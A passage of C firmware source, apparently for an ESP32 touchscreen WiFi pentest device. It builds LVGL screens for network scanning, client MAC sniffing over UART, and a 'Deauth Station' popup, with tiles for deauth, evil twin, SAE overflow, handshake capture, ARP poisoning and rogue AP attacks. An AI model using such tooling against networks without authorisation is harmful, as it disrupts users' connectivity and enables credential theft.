    lv_obj_set_style_bg_opa(btn_cont, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(btn_cont, 0, 0);
    lv_obj_set_style_pad_all(btn_cont, 0, 0);
    lv_obj_set_flex_flow(btn_cont, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_cont, LV_FLEX_ALIGN_END, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(btn_cont, 12, 0);
    
    // Spinner (hidden by default)
    spinner = lv_spinner_create(btn_cont);
    lv_obj_set_size(spinner, 32, 32);
    lv_spinner_set_anim_params(spinner, 1000, 200);
    lv_obj_add_flag(spinner, LV_OBJ_FLAG_HIDDEN);
    
    // Scan button
    scan_btn = lv_btn_create(btn_cont);
    lv_obj_set_size(scan_btn, 120, 40);
    lv_obj_set_style_bg_color(scan_btn, COLOR_MATERIAL_BLUE, 0);
    lv_obj_set_style_bg_color(scan_btn, lv_color_lighten(COLOR_MATERIAL_BLUE, 30), LV_STATE_PRESSED);
    lv_obj_set_style_bg_color(scan_btn, lv_color_hex(0x444444), LV_STATE_DISABLED);
    lv_obj_set_style_radius(scan_btn, 8, 0);
    lv_obj_add_event_cb(scan_btn, scan_btn_click_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *btn_label = lv_label_create(scan_btn);
    lv_label_set_text(btn_label, "RESCAN");
    lv_obj_set_style_text_font(btn_label, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(btn_label, lv_color_hex(0xFFFFFF), 0);
    lv_obj_center(btn_label);
    
    // Status label (compact)
    status_label = lv_label_create(scan_page);
    lv_label_set_text(status_label, "Press RESCAN to search for networks");
    lv_obj_set_style_text_font(status_label, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(status_label, lv_color_hex(0x888888), 0);
    
    // Network list container (scrollable) - fills remaining space above attack bar
    network_list = lv_obj_create(scan_page);
    lv_obj_set_width(network_list, lv_pct(100));
    lv_obj_set_flex_grow(network_list, 1);  // Take all remaining vertical space
    lv_obj_set_style_bg_color(network_list, lv_color_hex(0x1A1A1A), 0);
    lv_obj_set_style_border_color(network_list, lv_color_hex(0x333333), 0);
    lv_obj_set_style_border_width(network_list, 1, 0);
    lv_obj_set_style_radius(network_list, 8, 0);
    lv_obj_set_style_pad_all(network_list, 6, 0);
    lv_obj_set_flex_flow(network_list, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(network_list, 6, 0);
    lv_obj_set_scroll_dir(network_list, LV_DIR_VER);
    
    // Bottom icon bar for attack tiles
    lv_obj_t *attack_bar = lv_obj_create(scan_page);
    lv_obj_set_size(attack_bar, lv_pct(100), 70);
    lv_obj_set_style_bg_color(attack_bar, lv_color_hex(0x1A1A1A), 0);
    lv_obj_set_style_border_width(attack_bar, 0, 0);
    lv_obj_set_style_pad_all(attack_bar, 5, 0);
    lv_obj_set_style_pad_gap(attack_bar, 8, 0);
    lv_obj_set_flex_flow(attack_bar, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(attack_bar, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_clear_flag(attack_bar, LV_OBJ_FLAG_SCROLLABLE);
    
    // Create attack tiles in the bottom bar (some only visible when Red Team enabled)
    if (enable_red_team) {
        create_small_tile(attack_bar, LV_SYMBOL_CHARGE, "Deauth", COLOR_MATERIAL_RED, attack_tile_event_cb, "Deauth");
        create_small_tile(attack_bar, LV_SYMBOL_WARNING, "EvilTwin", COLOR_MATERIAL_ORANGE, attack_tile_event_cb, "Evil Twin");
        create_small_tile(attack_bar, LV_SYMBOL_POWER, "SAE", COLOR_MATERIAL_PINK, attack_tile_event_cb, "SAE Overflow");
        create_small_tile(attack_bar, LV_SYMBOL_DOWNLOAD, "Handshake", COLOR_MATERIAL_AMBER, attack_tile_event_cb, "Handshaker");
    }
    // ARP tile always visible (but poisoning blocked when Red Team disabled)
    create_small_tile(attack_bar, LV_SYMBOL_SHUFFLE, "ARP", COLOR_MATERIAL_PURPLE, attack_tile_event_cb, "ARP Poison");
    // Rogue AP tile (always visible when Red Team enabled)
    if (enable_red_team) {
        create_small_tile(attack_bar, LV_SYMBOL_WIFI, "RogueAP", COLOR_MATERIAL_CYAN, attack_tile_event_cb, "Rogue AP");
    }
    
    // Auto-start scan when entering the page
    lv_obj_send_event(scan_btn, LV_EVENT_CLICKED, NULL);
    
    // Set current visible page
    ctx->current_visible_page = ctx->scan_page;
}

// ======================= Network Observer Page =======================

// Forward declare popup poll task
static void popup_poll_task(void *arg);

// Popup timer callback - triggers poll task every 10s
static void popup_timer_callback(TimerHandle_t xTimer)
{
    (void)xTimer;
    
    tab_context_t *ctx = get_current_ctx();
    if (!ctx || !ctx->popup_open || !ctx->observer_running) return;
    
    // Only start new poll if previous one finished
    if (ctx->observer_task == NULL) {
        xTaskCreate(popup_poll_task, "popup_poll", 8192, (void*)ctx, 5, &ctx->observer_task);
    }
}

// Update popup content with current network data
static void update_popup_content(tab_context_t *ctx)
{
    if (!ctx) return;
    if (!ctx->network_popup || ctx->popup_network_idx < 0 || ctx->popup_network_idx >= ctx->observer_network_count) return;
    
    observer_network_t *net = &ctx->observer_networks[ctx->popup_network_idx];
    
    // Update clients container
    if (ctx->popup_clients_container) {
        lv_obj_clean(ctx->popup_clients_container);
        
        if (net->client_count == 0) {
            lv_obj_t *no_clients = lv_label_create(ctx->popup_clients_container);
            lv_label_set_text(no_clients, "No clients detected yet...");
            lv_obj_set_style_text_color(no_clients, lv_color_hex(0x666666), 0);
        } else {
            for (int j = 0; j < net->client_count && j < MAX_CLIENTS_PER_NETWORK; j++) {
                if (net->clients[j][0] != '\0') {
                    lv_obj_t *client_label = lv_label_create(ctx->popup_clients_container);
                    lv_label_set_text_fmt(client_label, "  %s", net->clients[j]);
                    lv_obj_set_style_text_font(client_label, &lv_font_montserrat_14, 0);
                    lv_obj_set_style_text_color(client_label, lv_color_hex(0xAAAAAA), 0);
                }
            }
        }
    }
}

// Popup close button click handler
static void popup_close_btn_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "Popup close button clicked");
    close_network_popup();
}

// Close network popup and resume normal monitoring
static void close_network_popup(void)
{
    tab_context_t *ctx = get_current_ctx();
    if (!ctx || !ctx->popup_open) return;
    
    ESP_LOGI(TAG, "Closing network popup");
    
    // Stop popup timer
    if (ctx->popup_timer != NULL) {
        xTimerStop(ctx->popup_timer, 0);
    }
    
    // Send unselect_networks to monitor all networks again
    // Use UART based on current tab
    uart_send_command_for_tab("unselect_networks");
        vTaskDelay(pdMS_TO_TICKS(100));
    uart_send_command_for_tab("start_sniffer_noscan");
    
    // Close popup UI
    if (ctx->network_popup) {
        lv_obj_del(ctx->network_popup);
        ctx->network_popup = NULL;
        ctx->popup_clients_container = NULL;
    }
    
    ctx->popup_open = false;
    ctx->popup_network_idx = -1;
    
    // Restart main observer timer (20s) for this context
    if (ctx->observer_timer != NULL && ctx->observer_running) {
        xTimerStart(ctx->observer_timer, 0);
        ESP_LOGI(TAG, "Resumed observer timer for tab %d (20s)", current_tab);
    }
    
    if (ctx->observer_table) {
        update_observer_table(ctx);
    }
}

// Show network popup for detailed view
static void show_network_popup(int network_idx)
{
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;
    
    if (network_idx < 0 || network_idx >= ctx->observer_network_count) return;
    if (ctx->popup_open) return;  // Already showing a popup on this tab
    
    observer_network_t *net = &ctx->observer_networks[network_idx];
    ESP_LOGI(TAG, "Opening popup for network: %s (scan_index=%d)", net->ssid, net->scan_index);
    
    ctx->popup_open = true;
    ctx->popup_network_idx = network_idx;
    
    // Stop main observer timer for this context
    if (ctx->observer_timer != NULL) {
        xTimerStop(ctx->observer_timer, 0);
        ESP_LOGI(TAG, "Stopped observer timer for tab %d", current_tab);
    }
    
    // Send commands to focus on this network
    // Use UART based on current tab
    char cmd[32];
    snprintf(cmd, sizeof(cmd), "select_networks %d", net->scan_index);
    
    uart_send_command_for_tab("stop");
        vTaskDelay(pdMS_TO_TICKS(200));
    uart_send_command_for_tab(cmd);
        vTaskDelay(pdMS_TO_TICKS(100));
    uart_send_command_for_tab("start_sniffer");
    
    // Create popup overlay
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    ctx->network_popup = lv_obj_create(container);
    lv_obj_set_size(ctx->network_popup, 600, 400);
    lv_obj_center(ctx->network_popup);
    lv_obj_set_style_bg_color(ctx->network_popup, lv_color_hex(0x1A2A2A), 0);
    lv_obj_set_style_border_color(ctx->network_popup, COLOR_MATERIAL_TEAL, 0);
    lv_obj_set_style_border_width(ctx->network_popup, 2, 0);
    lv_obj_set_style_radius(ctx->network_popup, 16, 0);
    lv_obj_set_style_shadow_width(ctx->network_popup, 30, 0);
    lv_obj_set_style_shadow_color(ctx->network_popup, lv_color_hex(0x000000), 0);
    lv_obj_set_style_shadow_opa(ctx->network_popup, LV_OPA_50, 0);
    lv_obj_set_style_pad_all(ctx->network_popup, 16, 0);
    lv_obj_set_flex_flow(ctx->network_popup, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(ctx->network_popup, 8, 0);
    
    // Header with title and close button
    lv_obj_t *header = lv_obj_create(ctx->network_popup);
    lv_obj_set_size(header, lv_pct(100), 40);
    lv_obj_set_style_bg_opa(header, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_set_style_pad_all(header, 0, 0);
    lv_obj_clear_flag(header, LV_OBJ_FLAG_SCROLLABLE);
    
    // Title
    lv_obj_t *title = lv_label_create(header);
    const char *ssid_display = strlen(net->ssid) > 0 ? net->ssid : "Unknown";
    lv_label_set_text_fmt(title, "Scanning only %s", ssid_display);
    lv_obj_set_style_text_font(title, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_TEAL, 0);
    lv_obj_align(title, LV_ALIGN_LEFT_MID, 0, 0);
    
    // Close button (X)
    lv_obj_t *close_btn = lv_btn_create(header);
    lv_obj_set_size(close_btn, 40, 40);
    lv_obj_align(close_btn, LV_ALIGN_RIGHT_MID, 0, 0);
    lv_obj_set_style_bg_color(close_btn, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_bg_color(close_btn, lv_color_lighten(COLOR_MATERIAL_RED, 30), LV_STATE_PRESSED);
    lv_obj_set_style_radius(close_btn, 8, 0);
    lv_obj_add_event_cb(close_btn, popup_close_btn_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *close_icon = lv_label_create(close_btn);
    lv_label_set_text(close_icon, LV_SYMBOL_CLOSE);
    lv_obj_set_style_text_color(close_icon, lv_color_hex(0xFFFFFF), 0);
    lv_obj_center(close_icon);
    
    // Network info section
    lv_obj_t *info_container = lv_obj_create(ctx->network_popup);
    lv_obj_set_size(info_container, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_color(info_container, lv_color_hex(0x0A1A1A), 0);
    lv_obj_set_style_border_width(info_container, 0, 0);
    lv_obj_set_style_radius(info_container, 8, 0);
    lv_obj_set_style_pad_all(info_container, 12, 0);
    lv_obj_set_flex_flow(info_container, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(info_container, 4, 0);
    lv_obj_clear_flag(info_container, LV_OBJ_FLAG_SCROLLABLE);
    
    // SSID
    lv_obj_t *ssid_label = lv_label_create(info_container);
    lv_label_set_text_fmt(ssid_label, "SSID: %s", ssid_display);
    lv_obj_set_style_text_font(ssid_label, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(ssid_label, lv_color_hex(0xFFFFFF), 0);
    
    // BSSID
    lv_obj_t *bssid_label = lv_label_create(info_container);
    lv_label_set_text_fmt(bssid_label, "BSSID: %s", net->bssid);
    lv_obj_set_style_text_font(bssid_label, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(bssid_label, lv_color_hex(0xCCCCCC), 0);
    
    // Channel + Band + RSSI
    lv_obj_t *channel_label = lv_label_create(info_container);
    lv_label_set_text_fmt(channel_label, "Channel: %d  |  %s  |  %d dBm", net->channel, net->band, net->rssi);
    lv_obj_set_style_text_font(channel_label, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(channel_label, lv_color_hex(0xCCCCCC), 0);
    
    // Clients section header
    lv_obj_t *clients_header = lv_label_create(ctx->network_popup);
    lv_label_set_text_fmt(clients_header, "Clients (%d):", net->client_count);
    lv_obj_set_style_text_font(clients_header, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(clients_header, COLOR_MATERIAL_TEAL, 0);
    
    // Clients scrollable container
    ctx->popup_clients_container = lv_obj_create(ctx->network_popup);
    lv_obj_set_size(ctx->popup_clients_container, lv_pct(100), lv_pct(100));
    lv_obj_set_flex_grow(ctx->popup_clients_container, 1);
    lv_obj_set_style_bg_color(ctx->popup_clients_container, lv_color_hex(0x0A1A1A), 0);
    lv_obj_set_style_border_width(ctx->popup_clients_container, 0, 0);
    lv_obj_set_style_radius(ctx->popup_clients_container, 8, 0);
    lv_obj_set_style_pad_all(ctx->popup_clients_container, 8, 0);
    lv_obj_set_flex_flow(ctx->popup_clients_container, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(ctx->popup_clients_container, 4, 0);
    lv_obj_set_scroll_dir(ctx->popup_clients_container, LV_DIR_VER);
    
    // Initial client list
    update_popup_content(ctx);
    
    // Create and start popup timer (10s polling)
    if (ctx->popup_timer == NULL) {
        ctx->popup_timer = xTimerCreate("popup_timer", 
                                   pdMS_TO_TICKS(POPUP_POLL_INTERVAL_MS),
                                   pdTRUE,  // Auto-reload
                                   NULL,
                                   popup_timer_callback);
    }
    
    if (ctx->popup_timer != NULL) {
        xTimerStart(ctx->popup_timer, 0);
        ESP_LOGI(TAG, "Started popup timer (10s polling)");
        
        // Do first poll after a short delay
        vTaskDelay(pdMS_TO_TICKS(2000));
        if (ctx->popup_open && ctx->observer_task == NULL) {
            xTaskCreate(popup_poll_task, "popup_poll", 8192, (void*)ctx, 5, &ctx->observer_task);
        }
    }
}

// Helper: Check if MAC already exists in network's client list
static bool client_mac_exists(observer_network_t *net, const char *mac)
{
    for (int i = 0; i < MAX_CLIENTS_PER_NETWORK; i++) {
        if (net->clients[i][0] != '\0' && strcmp(net->clients[i], mac) == 0) {
            return true;
        }
    }
    return false;
}

// Helper: Add client MAC to network if not already present, returns true if added
static bool add_client_mac(observer_network_t *net, const char *mac)
{
    // Check if already exists
    if (client_mac_exists(net, mac)) {
        return false;
    }
    
    // Find empty slot
    for (int i = 0; i < MAX_CLIENTS_PER_NETWORK; i++) {
        if (net->clients[i][0] == '\0') {
            strncpy(net->clients[i], mac, sizeof(net->clients[i]) - 1);
            net->clients[i][sizeof(net->clients[i]) - 1] = '\0';
            net->client_count++;
            return true;
        }
    }
    return false;  // No room
}

// Popup poll task - similar to observer_poll_task but updates popup content
static void popup_poll_task(void *arg)
{
    tab_context_t *ctx = (tab_context_t *)arg;
    if (!ctx) {
        ESP_LOGE(TAG, "Popup poll task: NULL context!");
        vTaskDelete(NULL);
        return;
    }
    
    ESP_LOGI(TAG, "Popup poll task started for network idx %d", ctx->popup_network_idx);
    
    if (!observer_rx_buffer || !observer_line_buffer || !ctx->observer_networks) {
        ESP_LOGE(TAG, "PSRAM buffers not allocated!");
        ctx->observer_task = NULL;
        vTaskDelete(NULL);
        return;
    }
    
    // Determine UART from context
    tab_id_t task_tab = tab_id_for_ctx(ctx);
    uart_port_t uart_port = (task_tab == TAB_MBUS && uart2_initialized) ? UART2_NUM : UART_NUM;
    
    uart_flush(uart_port);
    char cmd[] = "show_sniffer_results\r\n";
    transport_write_bytes_tab(task_tab, uart_port, cmd, strlen(cmd));
    
    char *rx_buffer = observer_rx_buffer;
    char *line_buffer = observer_line_buffer;
    int line_pos = 0;
    int current_network_idx = -1;
    
    // DON'T clear client data - accumulate clients over time
    
    TickType_t start_time = xTaskGetTickCount();
    TickType_t timeout_ticks = pdMS_TO_TICKS(5000);
    
    while ((xTaskGetTickCount() - start_time) < timeout_ticks) {
        int len = transport_read_bytes_tab(task_tab, uart_port, (uint8_t*)rx_buffer, UART_BUF_SIZE - 1, pdMS_TO_TICKS(100));
        
        if (len > 0) {
            rx_buffer[len] = '\0';
            
            for (int i = 0; i < len; i++) {
                char c = rx_buffer[i];
                
                if (c == '\n' || c == '\r') {
                    if (line_pos > 0) {
                        line_buffer[line_pos] = '\0';
                        
                        ESP_LOGD(TAG, "POPUP SNIFFER LINE: '%s'", line_buffer);
                        
                        // Check for network line (doesn't start with space)
                        if (line_buffer[0] != ' ' && line_buffer[0] != '\t') {
                            observer_network_t parsed_net = {0};
                            if (parse_sniffer_network_line(line_buffer, &parsed_net)) {
                                // Find this network in our existing list by SSID
                                current_network_idx = -1;
                                for (int n = 0; n < ctx->observer_network_count; n++) {
                                    if (strcmp(ctx->observer_networks[n].ssid, parsed_net.ssid) == 0) {
                                        current_network_idx = n;
                                        // Don't overwrite client_count - we track it via add_client_mac
                                        break;
                                    }
                                }
                            } else {
                                current_network_idx = -1;
                            }
                        }
                        // Check for client MAC line (starts with space)
                        else if ((line_buffer[0] == ' ' || line_buffer[0] == '\t') && current_network_idx >= 0) {
                            observer_network_t *net = &ctx->observer_networks[current_network_idx];
                            char mac[18];
                            if (parse_sniffer_client_line(line_buffer, mac, sizeof(mac))) {
                                // Add client if not already present (accumulate)
                                if (add_client_mac(net, mac)) {
                                    ESP_LOGI(TAG, "  -> NEW client: %s for '%s'", mac, net->ssid);
                                }
                            }
                        }
                        
                        line_pos = 0;
                    }
                } else if (line_pos < OBSERVER_LINE_BUFFER_SIZE - 1) {
                    line_buffer[line_pos++] = c;
                }
            }
        }
        
        if (!ctx->popup_open) {
            ESP_LOGI(TAG, "Popup closed during poll");
            break;
        }
    }
    
    // Update popup UI
    if (ctx->popup_open) {
        bsp_display_lock(0);
        update_popup_content(ctx);
        bsp_display_unlock();
    }
    
    ESP_LOGI(TAG, "Popup poll task finished");
    ctx->observer_task = NULL;
    vTaskDelete(NULL);
}

// Update observer table UI with current data
static void update_observer_table(tab_context_t *ctx)
{
    if (!ctx || !ctx->observer_table || !ctx->observer_networks) return;
    
    // Save current scroll position before cleaning
    lv_coord_t scroll_y = lv_obj_get_scroll_y(ctx->observer_table);
    
    lv_obj_clean(ctx->observer_table);
    
    for (int i = 0; i < ctx->observer_network_count; i++) {
        observer_network_t *net = &ctx->observer_networks[i];
        
        // Create network row (darker background, clickable) - 2 lines like WiFi Scanner
        lv_obj_t *net_row = lv_obj_create(ctx->observer_table);
        lv_obj_set_size(net_row, lv_pct(100), LV_SIZE_CONTENT);
        lv_obj_set_style_pad_all(net_row, 8, 0);
        lv_obj_set_style_bg_color(net_row, lv_color_hex(0x2D2D2D), 0);
        lv_obj_set_style_bg_color(net_row, lv_color_hex(0x3D3D3D), LV_STATE_PRESSED);
        lv_obj_set_style_border_width(net_row, 0, 0);
        lv_obj_set_style_radius(net_row, 8, 0);
        lv_obj_set_flex_flow(net_row, LV_FLEX_FLOW_COLUMN);
        lv_obj_set_style_pad_row(net_row, 4, 0);
        lv_obj_clear_flag(net_row, LV_OBJ_FLAG_SCROLLABLE);
        lv_obj_add_flag(net_row, LV_OBJ_FLAG_CLICKABLE);
        
        // Add click event with network index as user data
        lv_obj_add_event_cb(net_row, network_row_click_cb, LV_EVENT_CLICKED, (void*)(intptr_t)i);
        
        // First row: SSID (or "Hidden") + client count
        lv_obj_t *ssid_label = lv_label_create(net_row);
        if (strlen(net->ssid) > 0) {
            if (net->client_count > 0) {
                lv_label_set_text_fmt(ssid_label, "%s  (%d clients)", net->ssid, net->client_count);
            } else {
                lv_label_set_text(ssid_label, net->ssid);
            }
        } else {
            if (net->client_count > 0) {
                lv_label_set_text_fmt(ssid_label, "(Hidden)  (%d clients)", net->client_count);
            } else {
                lv_label_set_text(ssid_label, "(Hidden)");
            }
        }
        lv_obj_set_style_text_font(ssid_label, &lv_font_montserrat_18, 0);
        lv_obj_set_style_text_color(ssid_label, lv_color_hex(0xFFFFFF), 0);
        
        // Second row: BSSID | Band | RSSI (observer_network_t doesn't have security)
        lv_obj_t *info_label = lv_label_create(net_row);
        lv_label_set_text_fmt(info_label, "%s  |  %s  |  %d dBm", 
                              net->bssid, net->band, net->rssi);
        lv_obj_set_style_text_font(info_label, &lv_font_montserrat_12, 0);
        lv_obj_set_style_text_color(info_label, lv_color_hex(0x888888), 0);
        
        // Create client rows (indented, lighter background, clickable)
        for (int j = 0; j < MAX_CLIENTS_PER_NETWORK; j++) {
            if (net->clients[j][0] == '\0') continue;
            
            lv_obj_t *client_row = lv_obj_create(ctx->observer_table);
            lv_obj_set_size(client_row, lv_pct(100), LV_SIZE_CONTENT);
            lv_obj_set_style_pad_all(client_row, 6, 0);
            lv_obj_set_style_pad_left(client_row, 32, 0);  // Indent
            lv_obj_set_style_bg_color(client_row, lv_color_hex(0x1E2828), 0);
            lv_obj_set_style_bg_color(client_row, lv_color_hex(0x2E3838), LV_STATE_PRESSED);
            lv_obj_set_style_border_width(client_row, 0, 0);
            lv_obj_set_style_radius(client_row, 4, 0);
            lv_obj_clear_flag(client_row, LV_OBJ_FLAG_SCROLLABLE);
            lv_obj_add_flag(client_row, LV_OBJ_FLAG_CLICKABLE);
            
            // Pack network_idx and client_idx into user_data: (network_idx << 16) | client_idx
            intptr_t packed_data = ((intptr_t)i << 16) | (intptr_t)j;
            lv_obj_add_event_cb(client_row, client_row_click_cb, LV_EVENT_CLICKED, (void*)packed_data);
            
            lv_obj_t *mac_label = lv_label_create(client_row);
            lv_label_set_text(mac_label, net->clients[j]);
            lv_obj_set_style_text_font(mac_label, &lv_font_montserrat_14, 0);
            lv_obj_set_style_text_color(mac_label, COLOR_MATERIAL_TEAL, 0);
        }
    }
    
    // Restore scroll position after rebuild
    lv_obj_scroll_to_y(ctx->observer_table, scroll_y, LV_ANIM_OFF);
}

// Network row click handler
static void network_row_click_cb(lv_event_t *e)
{
    int network_idx = (int)(intptr_t)lv_event_get_user_data(e);
    ESP_LOGI(TAG, "Network row clicked: index %d", network_idx);
    
    tab_context_t *ctx = get_current_ctx();
    if (ctx && network_idx >= 0 && network_idx < ctx->observer_network_count) {
        show_network_popup(network_idx);
    }
}

// Client row click handler - opens deauth popup
static void client_row_click_cb(lv_event_t *e)
{
    intptr_t packed_data = (intptr_t)lv_event_get_user_data(e);
    int network_idx = (int)(packed_data >> 16);
    int client_idx = (int)(packed_data & 0xFFFF);
    
    ESP_LOGI(TAG, "Client row clicked: network=%d, client=%d", network_idx, client_idx);
    
    tab_context_t *ctx = get_current_ctx();
    if (ctx && network_idx >= 0 && network_idx < ctx->observer_network_count &&
        client_idx >= 0 && client_idx < MAX_CLIENTS_PER_NETWORK) {
        show_deauth_popup(network_idx, client_idx);
    }
}

// Show deauth popup for a specific client
static void show_deauth_popup(int network_idx, int client_idx)
{
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;
    
    // Block deauth if Red Team mode is disabled
    if (!enable_red_team) {
        ESP_LOGW(TAG, "Deauth blocked - Red Team mode disabled");
        if (ctx->observer_status_label) {
            lv_label_set_text(ctx->observer_status_label, "Deauth requires Red Team mode");
            lv_obj_set_style_text_color(ctx->observer_status_label, COLOR_MATERIAL_RED, 0);
        }
        return;
    }
    
    if (network_idx < 0 || network_idx >= ctx->observer_network_count) return;
    if (deauth_popup_obj != NULL) return;  // Already showing a popup
    
    observer_network_t *net = &ctx->observer_networks[network_idx];
    if (net->clients[client_idx][0] == '\0') return;
    
    const char *client_mac = net->clients[client_idx];
    ESP_LOGI(TAG, "Opening deauth popup for client: %s on network: %s", client_mac, net->ssid);
    
    deauth_network_idx = network_idx;
    deauth_client_idx = client_idx;
    deauth_active = false;  // Not yet deauthing
    
    // Stop main observer timer for this context
    if (ctx->observer_timer != NULL) {
        xTimerStop(ctx->observer_timer, 0);
        ESP_LOGI(TAG, "Stopped observer timer for deauth popup");
    }
    
    // Create popup overlay
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    deauth_popup_obj = lv_obj_create(container);
    lv_obj_set_size(deauth_popup_obj, 550, 320);
    lv_obj_center(deauth_popup_obj);
    lv_obj_set_style_bg_color(deauth_popup_obj, lv_color_hex(0x1A1A2A), 0);
    lv_obj_set_style_border_color(deauth_popup_obj, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_border_width(deauth_popup_obj, 2, 0);
    lv_obj_set_style_radius(deauth_popup_obj, 16, 0);
    lv_obj_set_style_shadow_width(deauth_popup_obj, 30, 0);
    lv_obj_set_style_shadow_color(deauth_popup_obj, lv_color_hex(0x000000), 0);
    lv_obj_set_style_shadow_opa(deauth_popup_obj, LV_OPA_50, 0);
    lv_obj_set_style_pad_all(deauth_popup_obj, 16, 0);
    lv_obj_set_flex_flow(deauth_popup_obj, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(deauth_popup_obj, 12, 0);
    
    // Header with title and close button
    lv_obj_t *header = lv_obj_create(deauth_popup_obj);
    lv_obj_set_size(header, lv_pct(100), 40);
    lv_obj_set_style_bg_opa(header, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_set_style_pad_all(header, 0, 0);
    lv_obj_clear_flag(header, LV_OBJ_FLAG_SCROLLABLE);
    
    // Title
    lv_obj_t *title = lv_label_create(header);
    lv_label_set_text(title, "Deauth Station");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_RED, 0);
    lv_obj_align(title, LV_ALIGN_LEFT_MID, 0, 0);
    
    // Close button (X)
    lv_obj_t *close_btn = lv_btn_create(header);
    lv_obj_set_size(close_btn, 40, 40);
    lv_obj_align(close_btn, LV_ALIGN_RIGHT_MID, 0, 0);
    lv_obj_set_style_bg_color(close_btn, lv_color_hex(0x444444), 0);
    lv_obj_set_style_bg_color(close_btn, lv_color_hex(0x555555), LV_STATE_PRESSED);
    lv_obj_set_style_radius(close_btn, 8, 0);
    lv_obj_add_event_cb(close_btn, deauth_btn_click_cb, LV_EVENT_CLICKED, (void*)(intptr_t)1);  // 1 = close button
    
    lv_obj_t *close_icon = lv_label_create(close_btn);
    lv_label_set_text(close_icon, LV_SYMBOL_CLOSE);
    lv_obj_set_style_text_color(close_icon, lv_color_hex(0xFFFFFF), 0);
    lv_obj_center(close_icon);
    
    // Network info section
    lv_obj_t *info_container = lv_obj_create(deauth_popup_obj);
    lv_obj_set_size(info_container, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_color(info_container, lv_color_hex(0x0A0A1A), 0);
    lv_obj_set_style_border_width(info_container, 0, 0);
    lv_obj_set_style_radius(info_container, 8, 0);
    lv_obj_set_style_pad_all(info_container, 12, 0);
    lv_obj_set_flex_flow(info_container, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(info_container, 4, 0);
    lv_obj_clear_flag(info_container, LV_OBJ_FLAG_SCROLLABLE);
    
    // SSID
    const char *ssid_display = strlen(net->ssid) > 0 ? net->ssid : "(Hidden)";
    lv_obj_t *ssid_label = lv_label_create(info_container);
    lv_label_set_text_fmt(ssid_label, "Network: %s", ssid_display);
    lv_obj_set_style_text_font(ssid_label, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(ssid_label, lv_color_hex(0xFFFFFF), 0);
    
    // BSSID + Channel
    lv_obj_t *bssid_label = lv_label_create(info_container);
    lv_label_set_text_fmt(bssid_label, "BSSID: %s  |  CH%d", net->bssid, net->channel);
    lv_obj_set_style_text_font(bssid_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(bssid_label, lv_color_hex(0xAAAAAA), 0);
    
    // Client MAC (highlighted)
    lv_obj_t *client_label = lv_label_create(info_container);
    lv_label_set_text_fmt(client_label, "Station: %s", client_mac);
    lv_obj_set_style_text_font(client_label, &lv_font_montserrat_18, 0);
    lv_obj_set_style_text_color(client_label, COLOR_MATERIAL_RED, 0);
    
    // Deauth button (red)
    deauth_btn = lv_btn_create(deauth_popup_obj);
    lv_obj_set_size(deauth_btn, lv_pct(100), 60);
    lv_obj_set_style_bg_color(deauth_btn, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_bg_color(deauth_btn, lv_color_lighten(COLOR_MATERIAL_RED, 30), LV_STATE_PRESSED);
    lv_obj_set_style_radius(deauth_btn, 12, 0);
    lv_obj_add_event_cb(deauth_btn, deauth_btn_click_cb, LV_EVENT_CLICKED, (void*)(intptr_t)0);  // 0 = deauth/stop button
    
    deauth_btn_label = lv_label_create(deauth_btn);
    lv_label_set_text(deauth_btn_label, "Deauth Station");
    lv_obj_set_style_text_font(deauth_btn_label, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(deauth_btn_label, lv_color_hex(0xFFFFFF), 0);
    lv_obj_center(deauth_btn_label);
}

// Close deauth popup and cleanup
static void close_deauth_popup(void)
{
    ESP_LOGI(TAG, "Closing deauth popup");
    
    // Send stop commands to current tab's UART
    uart_send_command_for_tab("stop");
    vTaskDelay(pdMS_TO_TICKS(100));
    uart_send_command_for_tab("start_sniffer_noscan");
    
    // Delete popup UI
    if (deauth_popup_obj != NULL) {
        lv_obj_del(deauth_popup_obj);
        deauth_popup_obj = NULL;
    }
    deauth_btn = NULL;
    deauth_btn_label = NULL;
    deauth_active = false;
    deauth_network_idx = -1;
    deauth_client_idx = -1;
    
    // Resume main observer timer
    if (observer_timer != NULL) {
        xTimerStart(observer_timer, 0);
        ESP_LOGI(TAG, "Resumed main observer timer");
    }
}

// Deauth button click handler
static void deauth_btn_click_cb(lv_event_t *e)
{
